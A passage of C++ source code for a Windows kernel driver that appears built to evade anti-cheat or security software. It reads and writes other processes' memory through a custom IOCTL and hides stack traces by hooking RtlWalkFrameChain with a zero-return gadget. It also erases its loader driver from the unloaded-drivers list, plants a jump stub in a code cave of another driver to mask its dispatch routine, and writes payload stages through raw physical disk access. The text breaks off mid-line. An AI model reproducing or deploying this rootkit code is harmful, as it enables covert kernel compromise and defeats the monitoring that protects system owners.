        if (NT_SUCCESS(pkt->Status)) {
            pkt->Status = KernelWrite(proc, (PVOID)pkt->AddressSrc,
                                      (PVOID)pkt->AddressDst, pkt->Size);
            ObDereferenceObject(proc);
        }
        break;

    case COMM_OP_GET_BASE:
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &proc);
        if (NT_SUCCESS(pkt->Status)) {
            pkt->AddressDst = (ULONGLONG)PsGetProcessSectionBaseAddress(proc);
            ObDereferenceObject(proc);
            pkt->Status = pkt->AddressDst ? STATUS_SUCCESS : STATUS_NOT_FOUND;
        }
        break;

    case COMM_OP_GET_MODULE:
        pkt->ModuleName[sizeof(pkt->ModuleName) - 1] = '\0';
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &proc);
        if (NT_SUCCESS(pkt->Status)) {
            UINT64 base = FindModuleBase(proc, pkt->ModuleName);
            ObDereferenceObject(proc);
            if (base) {
                pkt->AddressDst = base;
                pkt->Status     = STATUS_SUCCESS;
            } else {
                pkt->Status = STATUS_NOT_FOUND;
            }
        }
        break;

    case COMM_OP_GET_STATUS: {
        static_assert(sizeof(BYPASS_STATUS) <= sizeof(pkt->ModuleName),
                      "BYPASS_STATUS too large for ModuleName buffer");
        
        
        
        BYPASS_STATUS snap = g_drvStatus;
        if (g_pWalkChainPtr && snap.WalkChainHooked) {
            void* cur = *(void* volatile*)g_pWalkChainPtr;
            snap.WalkChainSlotVA = (ULONGLONG)cur;
            snap.WalkChainActive = (cur == (void*)snap.WalkChainGadgetVA) ? 1 : 0;
        }
        
        
        if (g_mmUnloadedArr) {
            UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
            BOOLEAN found = FALSE;
            for (ULONG i = 0; i < 50 && !found; i++) {
                if (g_mmUnloadedArr[i].Name.Buffer &&
                    RtlEqualUnicodeString(&g_mmUnloadedArr[i].Name, &vehicleName, TRUE))
                    found = TRUE;
            }
            snap.VehicleUnloadedLive = found ? 0 : 1;
        } else {
            snap.VehicleUnloadedLive = snap.VehicleUnloadedCleared;
        }
        RtlCopyMemory(pkt->ModuleName, &snap, sizeof(BYPASS_STATUS));
        pkt->Status = STATUS_SUCCESS;
        break;
    }

    case COMM_OP_CLEAN_VEHICLE: {
        UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        if (g_ntBase) ClearUnloadedEntryByName(g_ntBase, &vehicleName);
        pkt->Status = g_ntBase ? STATUS_SUCCESS : STATUS_NOT_FOUND;
        break;
    }

    default:
        pkt->Status = STATUS_INVALID_PARAMETER;
        break;
    }
}





static NTSTATUS DispatchCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    
    
    if (DeviceObject != g_pDevice) {
        if (g_origDevCtrl) return g_origDevCtrl(DeviceObject, Irp);
        Irp->IoStatus.Status      = STATUS_NOT_SUPPORTED;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_NOT_SUPPORTED;
    }

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_COMM) {
        ULONG inLen  = stack->Parameters.DeviceIoControl.InputBufferLength;
        ULONG outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
        NTSTATUS  status = STATUS_BUFFER_TOO_SMALL;
        ULONG_PTR info   = 0;

        if (inLen >= sizeof(COMM_PACKET) && outLen >= sizeof(COMM_PACKET)) {
            COMM_PACKET* pkt = (COMM_PACKET*)Irp->AssociatedIrp.SystemBuffer;
            ProcessCommPacket(pkt);
            info   = sizeof(COMM_PACKET);
            status = STATUS_SUCCESS;
        }
        Irp->IoStatus.Status      = status;
        Irp->IoStatus.Information = info;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return status;
    }

    
    if (g_origDevCtrl) return g_origDevCtrl(DeviceObject, Irp);
    Irp->IoStatus.Status      = STATUS_INVALID_DEVICE_REQUEST;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INVALID_DEVICE_REQUEST;
}



















static ULONG FakeWalkFrameChain(PVOID* Callers, ULONG Count, ULONG Flags) {
    UNREFERENCED_PARAMETER(Callers);
    UNREFERENCED_PARAMETER(Count);
    UNREFERENCED_PARAMETER(Flags);
    return 0;
}




static PVOID FindZeroRetGadget(PVOID ntBase) {
    PUCHAR base; SIZE_T size;
    if (!GetImageSection(ntBase, ".text", &base, &size)) return nullptr;
    static const UCHAR pat[] = { 0x33, 0xC0, 0xC3 };
    return PatternScan(base, size, pat, sizeof(pat));
}













static void** FindRtlWalkFrameChainPtr(PVOID ntBase) {
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"RtlWalkFrameChain");
    PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!fn) {
        LOG("[!] FindRtlWalkFrameChainPtr: RtlWalkFrameChain not exported\n");
        return nullptr;
    }

    
    PUCHAR ntTextBase = nullptr; SIZE_T ntTextSize = 0;
    GetImageSection(ntBase, ".text", &ntTextBase, &ntTextSize);

    auto IsCodePtr = [&](PVOID p) -> BOOLEAN {
        if (!IsKernelPointer(p)) return FALSE;
        if (ntTextBase && (PUCHAR)p >= ntTextBase && (PUCHAR)p < ntTextBase + ntTextSize)
            return TRUE;
        
        return (PUCHAR)p < fn || (PUCHAR)p > fn + 256;
    };

    for (int i = 0; i < 256; i++) {
        if (!MmIsAddressValid(fn + i + 7)) break;
        PUCHAR p = fn + i;

        
        if (p[0] == 0xFF && (p[1] == 0x15 || p[1] == 0x25)) {
            INT32 disp = *(INT32*)(p + 2);
            void** slot = (void**)(p + 6 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot)) {
                LOG("[+] FindRtlWalkFrameChainPtr: FF %02X at +%d slot=%p\n", p[1], i, slot);
                return slot;
            }
        }

        
        if ((p[0] & 0xF0) == 0x48 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
            INT32 disp = *(INT32*)(p + 3);
            void** slot = (void**)(p + 7 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot)) {
                PVOID val = *(PVOID*)slot;
                if (IsCodePtr(val)) {
                    LOG("[+] FindRtlWalkFrameChainPtr: MOV at +%d slot=%p val=%p\n", i, slot, val);
                    return slot;
                }
            }
        }
    }

    
    PVOID target = (PVOID)fn;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntBase;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)ntBase + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++) {
                if (sec->Characteristics & IMAGE_SCN_CNT_CODE)   continue; 
                if (!(sec->Characteristics & IMAGE_SCN_MEM_WRITE)) continue; 
                PUCHAR sbase = (PUCHAR)ntBase + sec->VirtualAddress;
                SIZE_T ssize = sec->Misc.VirtualSize;
                for (SIZE_T j = 0; j + sizeof(PVOID) <= ssize; j += sizeof(PVOID)) {
                    if (!MmIsAddressValid(sbase + j)) continue;
                    if (*(PVOID*)(sbase + j) == target) {
                        LOG("[+] FindRtlWalkFrameChainPtr: section scan hit at %.8s+0x%zX\n",
                            sec->Name, j);
                        return (void**)(sbase + j);
                    }
                }
            }
        }
    }

    LOG("[!] FindRtlWalkFrameChainPtr: not found on this build\n");
    return nullptr;
}

static VOID InstallWalkChainHook(PVOID ntBase) {
    g_pWalkChainPtr = FindRtlWalkFrameChainPtr(ntBase);
    if (!g_pWalkChainPtr) return;

    
    
    PVOID replacement = FindZeroRetGadget(ntBase);
    if (!replacement) {
        LOG("[!] WalkChainHook: gadget not found — hook skipped (pool fallback removed)\n");
        return;
    }
    LOG("[+] WalkChainHook: using ntoskrnl gadget at %p\n", replacement);

    g_origWalkChain = InterlockedExchangePointer(g_pWalkChainPtr, replacement);
    g_drvStatus.WalkChainHooked     = 1;
    g_drvStatus.WalkChainUsedGadget = 1;
    g_drvStatus.WalkChainGadgetVA   = (ULONGLONG)replacement;
    g_drvStatus.WalkChainPtrVA      = (ULONGLONG)g_pWalkChainPtr;
    LOG("[+] WalkChainHook installed: pPtr=%p orig=%p replacement=%p\n",
        g_pWalkChainPtr, g_origWalkChain, replacement);
}

static VOID RemoveWalkChainHook() {
    if (g_pWalkChainPtr && g_origWalkChain)
        InterlockedExchangePointer(g_pWalkChainPtr, g_origWalkChain);
}














static PUCHAR g_cavePtr = nullptr;







static PUCHAR FindCodeCave(PVOID base, SIZE_T need) {
    if (!base) return nullptr;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    ULONG secAlign  = nt->OptionalHeader.SectionAlignment;
    ULONG fileAlign = nt->OptionalHeader.FileAlignment;
    if (!secAlign) secAlign = 0x1000;
    if (!fileAlign) fileAlign = 0x200;

    
    
    
    
    
    for (int pass = 0; pass < 2; pass++) {
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
            if (!sec->Misc.VirtualSize) continue;

            SIZE_T paddedSize = ((SIZE_T)sec->Misc.VirtualSize + secAlign - 1) & ~(SIZE_T)(secAlign - 1);
            if (paddedSize <= sec->Misc.VirtualSize) continue;
            SIZE_T tailBytes = paddedSize - sec->Misc.VirtualSize;
            if (tailBytes < need) continue;

            
            
            ULONG rawPadded = (sec->SizeOfRawData + fileAlign - 1) & ~(fileAlign - 1);
            bool trueTail = (rawPadded < (ULONG)paddedSize);
            if (pass == 0 && !trueTail) continue;

            PUCHAR tail = (PUCHAR)base + sec->VirtualAddress + sec->Misc.VirtualSize;
            BOOLEAN ok = TRUE;
            for (SIZE_T j = 0; j < need; j++) {
                if (!MmIsAddressValid(tail + j) ||
                    (tail[j] != 0x00 && tail[j] != 0xCC)) { ok = FALSE; break; }
            }
            if (ok) return tail;
        }
    }
    return nullptr;
}











static PUCHAR WriteStubToCave(PUCHAR cave, PVOID target, UCHAR fill) {
    PMDL mdl = IoAllocateMdl(cave, 16, FALSE, FALSE, NULL);
    if (!mdl) return nullptr;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return nullptr; }
    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            if (target) {
                UCHAR stub[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0,0,0,0,0,0,0,0 };
                *(PVOID*)(stub + 6) = target; 
                RtlCopyMemory(mapped, stub, 14);
            } else {
                RtlFillMemory(mapped, 14, fill); 
            }
            st = STATUS_SUCCESS;
        } else { st = STATUS_UNSUCCESSFUL; }
        MmUnmapLockedPages(mapped, mdl);
    } else { st = STATUS_INSUFFICIENT_RESOURCES; }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return NT_SUCCESS(st) ? cave : nullptr;
}




static BOOLEAN IsCaveDenied(const UNICODE_STRING* name) {
    static const WCHAR* const kDenylist[] = {
        L"CI.dll",          
        L"hal.dll",         
        L"win32k.sys",      
        L"win32kbase.sys",
        L"win32kfull.sys",
        L"ksecdd.sys",      
        L"ndis.sys",        
        L"tcpip.sys",
        L"fltMgr.sys",      
        L"ACPI.sys",        
        L"pci.sys",         
    };
    if (!name->Buffer || name->Length == 0) return FALSE;
    for (ULONG i = 0; i < ARRAYSIZE(kDenylist); i++) {
        UNICODE_STRING cmp;
        RtlInitUnicodeString(&cmp, kDenylist[i]);
        if (RtlEqualUnicodeString(name, &cmp, TRUE)) return TRUE;
    }
    return FALSE;
}



static PDRIVER_DISPATCH InstallCaveTrampoline(PVOID ntBase, PDRIVER_OBJECT pDevOwner) {
    if (!pDevOwner || !pDevOwner->DriverSection) return nullptr;
    PLDR_DATA_TABLE_ENTRY ldr0 = (PLDR_DATA_TABLE_ENTRY)pDevOwner->DriverSection;
    PLIST_ENTRY head = &ldr0->InLoadOrderLinks;
    ULONG guard = 0;
    for (PLIST_ENTRY cur = head->Flink;
         cur && cur != head && ++guard < 256;
         cur = cur->Flink) {
        PLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!e->DllBase) continue;
        if (e->DllBase == ntBase)         continue; 
        if (e->DllBase == ldr0->DllBase)  continue; 
        if (IsCaveDenied(&e->BaseDllName)) {
            LOG("[~] CaveTrampoline: skipping denied driver %wZ\n", &e->BaseDllName);
            continue;
        }
        PUCHAR cave = FindCodeCave(e->DllBase, 16);
        if (!cave) continue;
        PUCHAR result = WriteStubToCave(cave, (PVOID)DispatchIoctl, 0xCC);
        if (result) {
            g_cavePtr = result;
            g_drvStatus.CaveInstalled = 1;
            g_drvStatus.CaveVA        = (ULONGLONG)result;
            
            ULONG cn = e->BaseDllName.Length / sizeof(WCHAR);
            if (cn >= sizeof(g_drvStatus.CaveModule))
                cn = sizeof(g_drvStatus.CaveModule) - 1;
            for (ULONG ci = 0; ci < cn; ci++)
                g_drvStatus.CaveModule[ci] = (CHAR)e->BaseDllName.Buffer[ci];
            g_drvStatus.CaveModule[cn] = '\0';
            LOG("[+] CaveTrampoline: stub installed cave=%p\n", result);
            return (PDRIVER_DISPATCH)result;
        }
    }
    LOG("[!] CaveTrampoline: no suitable cave — using direct pointer\n");
    return nullptr;
}



static VOID ZeroCave() {
    if (!g_cavePtr) return;
    WriteStubToCave(g_cavePtr, nullptr, 0xCC);
    g_cavePtr = nullptr;
}




static BOOLEAN WritePhysPage(PVOID dstVa, PVOID srcVa, SIZE_T size) {
    PMDL mdl = IoAllocateMdl(dstVa, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) return FALSE;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return FALSE; }
    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            RtlCopyMemory(mapped, srcVa, size);
            st = STATUS_SUCCESS;
        } else {
            st = STATUS_UNSUCCESSFUL;
        }
        MmUnmapLockedPages(mapped, mdl);
    } else {
        st = STATUS_INSUFFICIENT_RESOURCES;
    }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return NT_SUCCESS(st);
}
























static PVOID FindSelfBase(PVOID hint) {
    PUCHAR page = (PUCHAR)((ULONG_PTR)hint & ~0xFFFULL);
    for (ULONG i = 0; i < 0x200; i++, page -= 0x1000) {
        if (!MmIsAddressValid(page)) continue;
        if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
        if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000) continue;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
        if (!MmIsAddressValid(nt)) continue;
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
        ULONG imgSize = nt->OptionalHeader.SizeOfImage;
        if (imgSize && (PUCHAR)hint >= page && (PUCHAR)hint < page + imgSize)
            return page;
    }
    return nullptr;
}



#define RD_STEP_FILE_OPEN     1   
#define RD_STEP_FSINFO        2   
#define RD_STEP_FSCTL         3   
#define RD_STEP_VOL_PATH      4   
#define RD_STEP_VOL_OPEN      5   
#define RD_STEP_ALLOC         6   
#define RD_STEP_WRITE         7   
#define RD_STEP_OK            8   
#define RD_STEP_ALL_SPARSE    9   
#define RD_STEP_DECOMP_FAIL  10   
#define RD_STEP_DISKEXT      11   
#define RD_STEP_PHYS_OPEN    12   

#ifndef FSCTL_SET_COMPRESSION
#define FSCTL_SET_COMPRESSION 0x0009C040  
#endif


#define IOCTL_VOLUME_DISK_EXTENTS 0x00560000

typedef struct { ULONG DiskNumber; LARGE_INTEGER StartingOffset; LARGE_INTEGER ExtentLength; } RAW_DISK_EXTENT_ENTRY;
typedef struct { ULONG Count; RAW_DISK_EXTENT_ENTRY Extents[1]; } RAW_VOLUME_DISK_EXTENTS;





















#ifndef FSCTL_GET_RETRIEVAL_POINTERS
#define FSCTL_GET_RETRIEVAL_POINTERS 0x00090073
#endif

typedef struct { LARGE_INTEGER StartingVcn; } RAW_STARTING_VCN;





#define RAW_MAX_EXTENTS 128
typedef struct {
    ULONG         ExtentCount;
    LARGE_INTEGER StartingVcn;
    struct { LARGE_INTEGER NextVcn; LARGE_INTEGER Lcn; } Extents[RAW_MAX_EXTENTS];
} RAW_RETRIEVAL_BUFFER;

typedef struct {
    LARGE_INTEGER TotalAllocationUnits;
    LARGE_INTEGER AvailableAllocationUnits;
    ULONG         SectorsPerAllocationUnit;
    ULONG         BytesPerSector;
} RAW_FS_SIZE_INFO;



static BOOLEAN ExtractVolumeDevicePath(PUNICODE_STRING filePath,
                                       PWCHAR outBuf, USHORT outCapChars,
                                       PUNICODE_STRING outStr) {
    USHORT slashes = 0, i;
    for (i = 0; i < filePath->Length / sizeof(WCHAR) && i < outCapChars - 1; i++) {
        WCHAR c = filePath->Buffer[i];
        if (c == L'\\' && ++slashes == 3) break;
        outBuf[i] = c;
    }
    if (slashes < 2) return FALSE;
    outBuf[i]             = L'\0';
    outStr->Buffer        = outBuf;
    outStr->Length        = (USHORT)(i * sizeof(WCHAR));
    outStr->MaximumLength = (USHORT)(outCapChars * sizeof(WCHAR));
    return outStr->Length > 0;
}

static BOOLEAN WriteStageToDiskRaw(PUNICODE_STRING filePath, PVOID data, ULONG size) {
    NTSTATUS          st;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK   iosb;

    
    
    
    InitializeObjectAttributes(&oa, filePath,
                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hFile = NULL;
    st = ZwCreateFile(&hFile,
                      FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE, &oa, &iosb,
                      NULL, 0,
                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                      FILE_OPEN,
                      FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                      NULL, 0);
    if (!NT_SUCCESS(st)) {
        g_drvStatus.RawDiskStep     = RD_STEP_FILE_OPEN;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: open file failed 0x%08X\n", st); return FALSE;
    }

    
    RAW_FS_SIZE_INFO fsInfo = {};
    IO_STATUS_BLOCK  iosb2  = {};
    st = ZwQueryVolumeInformationFile(hFile, &iosb2, &fsInfo, sizeof(fsInfo),
                                      (FS_INFORMATION_CLASS)3 /*FileFsSizeInformation*/);
    if (!NT_SUCCESS(st) || !fsInfo.BytesPerSector || !fsInfo.SectorsPerAllocationUnit) {
        g_drvStatus.RawDiskStep     = RD_STEP_FSINFO;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: FileFsSizeInformation failed 0x%08X\n", st);
        ZwClose(hFile); return FALSE;
    }
    ULONG bytesPerCluster = fsInfo.BytesPerSector * fsInfo.SectorsPerAllocationUnit;
    ULONG bytesPerSector  = fsInfo.BytesPerSector;

    
    
    
    
    
    struct { UNICODE_STRING us; WCHAR buf[300]; } nameInfo = {};
    ULONG nameRetLen = 0;
    PUNICODE_STRING canonPath = filePath;  
    st = ZwQueryObject(hFile, (OBJECT_INFORMATION_CLASS)1 /*ObjectNameInformation*/,
                       &nameInfo, sizeof(nameInfo), &nameRetLen);
    if (NT_SUCCESS(st) && nameInfo.us.Length > 0 && nameInfo.us.Buffer) {
        canonPath = &nameInfo.us;
        LOG("[~] RawDisk: canonical path %wZ\n", canonPath);
    } else {
        LOG("[~] RawDisk: ZwQueryObject 0x%08X, falling back to LDR path %wZ\n", st, filePath);
    }

    
    RAW_RETRIEVAL_BUFFER rpb      = {};
    RAW_STARTING_VCN     startVcn = {};
    IO_STATUS_BLOCK      iosb3    = {};
    st = ZwFsControlFile(hFile, NULL, NULL, NULL, &iosb3,
                         FSCTL_GET_RETRIEVAL_POINTERS,
                         &startVcn, sizeof(startVcn),
                         &rpb, sizeof(rpb));
    ZwClose(hFile);
    
    
    if (!NT_SUCCESS(st) && st != STATUS_BUFFER_OVERFLOW) {
        g_drvStatus.RawDiskStep     = RD_STEP_FSCTL;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: FSCTL_GET_RETRIEVAL_POINTERS failed 0x%08X\n", st); return FALSE;
    }
    if (!rpb.ExtentCount) {
        g_drvStatus.RawDiskStep     = RD_STEP_FSCTL;
        g_drvStatus.RawDiskNtStatus = 0;
        LOG("[!] RawDisk: zero extents returned\n"); return FALSE;
    }
    if (st == STATUS_BUFFER_OVERFLOW)
        LOG("[~] RawDisk: extent map truncated (%u extents fit)\n", rpb.ExtentCount);

    
    g_drvStatus.RawDiskFsctlStatus  = (unsigned long)st;
    g_drvStatus.RawDiskExtentCount  = rpb.ExtentCount;
    if (rpb.ExtentCount > 0) {
        g_drvStatus.RawDiskFirstLcnLo = (unsigned long)(rpb.Extents[0].Lcn.QuadPart & 0xFFFFFFFF);
        g_drvStatus.RawDiskFirstLcnHi = (unsigned long)((rpb.Extents[0].Lcn.QuadPart >> 32) & 0xFFFFFFFF);
    }

    
    
    
    
    
    
    
    
    
    
    {
        BOOLEAN allSparse = (rpb.ExtentCount > 0);
        for (ULONG chk = 0; chk < rpb.ExtentCount && allSparse; chk++)
            if (rpb.Extents[chk].Lcn.QuadPart >= 0) { allSparse = FALSE; break; }

        if (allSparse) {
            LOG("[~] RawDisk: all %u extents LCN=-1 (compressed) - attempting kernel decompression\n",
                rpb.ExtentCount);

            USHORT        comprNone = 0;
            OBJECT_ATTRIBUTES oaD  = {};
            IO_STATUS_BLOCK   iosbD = {};
            InitializeObjectAttributes(&oaD, canonPath,
                                       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
            HANDLE  hDec = NULL;
            NTSTATUS stD = ZwCreateFile(&hDec,
                FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE, &oaD, &iosbD,
                NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
            if (NT_SUCCESS(stD)) {
                IO_STATUS_BLOCK iosbC = {};
                stD = ZwFsControlFile(hDec, NULL, NULL, NULL, &iosbC,
                    FSCTL_SET_COMPRESSION, &comprNone, sizeof(comprNone), NULL, 0);
                ZwClose(hDec);
            }

            if (NT_SUCCESS(stD)) {
                
                HANDLE        hFile2 = NULL;
                OBJECT_ATTRIBUTES oaR = {};
                IO_STATUS_BLOCK   iosbR = {};
                InitializeObjectAttributes(&oaR, canonPath,
                                           OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
                stD = ZwCreateFile(&hFile2,
                    FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE, &oaR, &iosbR,
                    NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
                if (NT_SUCCESS(stD)) {
                    startVcn.StartingVcn.QuadPart = 0;
                    RtlZeroMemory(&rpb, sizeof(rpb));
                    IO_STATUS_BLOCK iosbE = {};
                    stD = ZwFsControlFile(hFile2, NULL, NULL, NULL, &iosbE,
                        FSCTL_GET_RETRIEVAL_POINTERS,
                        &startVcn, sizeof(startVcn), &rpb, sizeof(rpb));
                    ZwClose(hFile2);
                    if (NT_SUCCESS(stD) || stD == STATUS_BUFFER_OVERFLOW) {
                        LOG("[+] RawDisk: decompressed OK - %u extents after retry\n", rpb.ExtentCount);
                    } else {
                        g_drvStatus.RawDiskStep     = RD_STEP_DECOMP_FAIL;
                        g_drvStatus.RawDiskNtStatus = (unsigned long)stD;
                        LOG("[!] RawDisk: post-decompress FSCTL failed 0x%08X\n", stD);
                        return FALSE;
                    }
                } else {
                    g_drvStatus.RawDiskStep     = RD_STEP_DECOMP_FAIL;
                    g_drvStatus.RawDiskNtStatus = (unsigned long)stD;
                    LOG("[!] RawDisk: post-decompress reopen failed 0x%08X\n", stD);
                    return FALSE;
                }
            } else {
                
                
                g_drvStatus.RawDiskStep     = RD_STEP_DECOMP_FAIL;
                g_drvStatus.RawDiskNtStatus = (unsigned long)stD;
                LOG("[!] RawDisk: FSCTL_SET_COMPRESSION failed 0x%08X (image section lock)\n", stD);
                return FALSE;
            }
        }
    }

    
    
    
    
    
    

    WCHAR          volBuf[64] = {};
    UNICODE_STRING volPath    = {};
    if (!ExtractVolumeDevicePath(canonPath, volBuf, 64, &volPath)) {
        g_drvStatus.RawDiskStep     = RD_STEP_VOL_PATH;
        g_drvStatus.RawDiskNtStatus = 0;
        LOG("[!] RawDisk: failed to extract volume path from %wZ\n", canonPath); return FALSE;
    }

    
    InitializeObjectAttributes(&oa, &volPath,
                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    IO_STATUS_BLOCK iosb4r = {};
    HANDLE hVolRd = NULL;
    st = ZwCreateFile(&hVolRd,
                      FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb4r,
                      NULL, 0,
                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                      FILE_OPEN,
                      FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                      NULL, 0);
    if (!NT_SUCCESS(st)) {
        g_drvStatus.RawDiskStep     = RD_STEP_VOL_OPEN;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: open volume %wZ for read failed 0x%08X\n", &volPath, st); return FALSE;
    }

    RAW_VOLUME_DISK_EXTENTS vde = {};
    IO_STATUS_BLOCK         iosbDE = {};
    st = ZwDeviceIoControlFile(hVolRd, NULL, NULL, NULL, &iosbDE,
                               IOCTL_VOLUME_DISK_EXTENTS,
                               NULL, 0, &vde, sizeof(vde));
    ZwClose(hVolRd);
    if (!NT_SUCCESS(st) || vde.Count == 0) {
        g_drvStatus.RawDiskStep     = RD_STEP_DISKEXT;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: IOCTL_VOLUME_DISK_EXTENTS failed 0x%08X\n", st); return FALSE;
    }

    ULONG    diskNum   = vde.Extents[0].DiskNumber;
    LONGLONG partStart = vde.Extents[0].StartingOffset.QuadPart;
    g_drvStatus.RawDiskPhysNum = diskNum;
    LOG("[~] RawDisk: disk %u  partStart=0x%llX\n", diskNum, (unsigned long long)partStart);

    
    
    
    

    
    auto AppendDiskNum = [](WCHAR* buf, ULONG off, ULONG num) -> ULONG {
        ULONG digits = 0;
        { ULONG t = num; do { digits++; t /= 10; } while (t); }
        ULONG n2 = num;
        for (ULONG d = digits; d > 0; d--) { buf[off + d - 1] = L'0' + (WCHAR)(n2 % 10); n2 /= 10; }
        return off + digits;
    };

    
    WCHAR dr0Buf[56] = L"\\Device\\Harddisk";
    ULONG dr0Off = AppendDiskNum(dr0Buf, 16, diskNum);
    dr0Buf[dr0Off++] = L'\\'; dr0Buf[dr0Off++] = L'D'; dr0Buf[dr0Off++] = L'R';
    dr0Buf[dr0Off++] = L'0'; dr0Buf[dr0Off] = L'\0';

    
    WCHAR p0Buf[56] = L"\\Device\\Harddisk";
    ULONG p0Off = AppendDiskNum(p0Buf, 16, diskNum);
    p0Buf[p0Off++] = L'\\'; p0Buf[p0Off++] = L'P'; p0Buf[p0Off++] = L'a';
